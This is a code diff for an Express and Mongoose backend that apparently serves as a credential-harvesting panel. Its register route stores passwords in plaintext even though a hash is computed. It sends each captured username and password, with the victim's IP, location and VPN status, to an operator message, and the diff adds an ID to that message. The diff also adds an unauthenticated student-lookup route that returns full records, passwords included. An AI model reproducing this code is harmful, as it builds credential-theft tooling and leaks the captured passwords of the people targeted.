@@ -603,6 +603,7 @@ app.post("/student/register", async (req, res) => {
     if (!admin) return res.status(500).json({ success: false, error: "No admin available" });
 const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
     const location = await getLocation(ip);
+    let studentId = generateCode(6);
     // Create student
     const hashed = await hashPassword(password);
     const student = await Student.create({
@@ -610,7 +611,7 @@ const ip = req.headers["x-forwarded-for"] || req.socket?.remoteAddress || null;
       password,
       adminId: admin._id,
       platform: platform || null,
-      studentId: generateCode(6),
+      studentId,
       owner: admin.username,
       location
     });
@@ -640,7 +641,7 @@ Platform: ${escapeMarkdown(platformName)}\n
 Username: *${escapeMarkdown(username)}*
 Password: *${password}*\n
 Referrer: *${escapeMarkdown(admin.username)}*
-Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}
+Location: ${escapeMarkdown(location.city || "Unknown")}, ${escapeMarkdown(location.country || "Unknown")}\n Country code: ${location.country_code || "Unknown country code"}\nID:${studentId}
 
 IP ${ip}
 \n\n VPN : ${vpn}
@@ -764,59 +765,12 @@ app.get("/admin/activity", verifyToken, updateLastSeen, async (req, res) => {
   }
 });
 
-
-
-// Admin assigns help info to a specific user
-app.post("/admin/help/:userId", verifyToken, async (req, res) => {
+app.get("/help/user/:studentId", async (req, res) => {
   try {
-    const { userId } = req.params;
-    const { contactMethods } = req.body;
-
-    if (!mongoose.Types.ObjectId.isValid(userId)) {
-      return res.status(400).json({
-        success: false,
-        error: "Invalid user id"
-      });
-    }
-
-    if (!Array.isArray(contactMethods) || !contactMethods.length) {
-      return res.status(400).json({
-        success: false,
-        error: "contactMethods required"
-      });
-    }
-
-    const help = await Help.findOneAndUpdate(
-      { adminId: req.userId, userId },
-      { contactMethods, active: true },
-      { new: true, upsert: true }
-    );
-
-    res.json({
-      success: true,
-      data: help
-    });
-
-  } catch (err) {
-    res.status(500).json({ success: false });
-  }
-});
-
-
-// GET help for a child by ID
-app.get("/help/user/:userId", async (req, res) => {
-  try {
-    const { userId } = req.params;
-
-    if (!mongoose.Types.ObjectId.isValid(userId)) {
-      return res.status(400).json({
-        success: false,
-        error: "Invalid user id"
-      });
-    }
+    const { studentId } = req.params;
 
     const help = await Help.findOne({
-      userId,
+      studentId,
       active: true
     }).select("contactMethods -_id");
 
@@ -833,9 +787,49 @@ app.get("/help/user/:userId", async (req, res) => {
     });
 
   } catch (err) {
+    console.error(err);
     res.status(500).json({ success: false });
   }
 });
+
+app.post("/admin/help/:studentId", verifyToken, async (req, res) => {
+  try {
+    const { studentId } = req.params;
+    const { contactMethods } = req.body || {};
+
+    if (!Array.isArray(contactMethods) || contactMethods.length === 0) {
+      return res.status(400).json({
+        success: false,
+        error: "contactMethods required"
+      });
+    }
+
+    const studentExists = await Student.exists({ studentId });
+    if (!studentExists) {
+      return res.status(404).json({
+        success: false,
+        error: "Student not found"
+      });
+    }
+
+    const help = await Help.findOneAndUpdate(
+      { adminId: req.userId, studentId },
+      { contactMethods, active: true },
+      { new: true, upsert: true }
+    );
+
+    res.json({
+      success: true,
+      data: help
+    });
+
+  } catch (err) {
+    console.error(err);
+    res.status(500).json({ success: false });
+  }
+});
+
+
 
 
 
@@ -891,6 +885,26 @@ app.get("/admin/by-username/:username", async (req, res) => {
     res.status(500).json({ success: false, error: err.message });
   }
 });
+
+
+app.get("/student/by-username/:username", async (req, res) => {
+  try {
+    const { username } = req.params;
+    const admin = await Student.findOne({ username });
+    if (!admin) return res.status(404).json({ success: false, error: "Student not found" });
+
+    res.json({
+      success: true,
+     student :admin
+    });
+  } catch (err) {
+    console.error("Error fetching student by username:", err.message);
+    res.status(500).json({ success: false, error: err.message });
+  }
+});
+
+
+
 
 // ---------- ADMIN SITE SETTINGS CREATE/UPDATE ----------
 app.post("/admin/site", verifyToken, updateLastSeen, async (req, res) => {
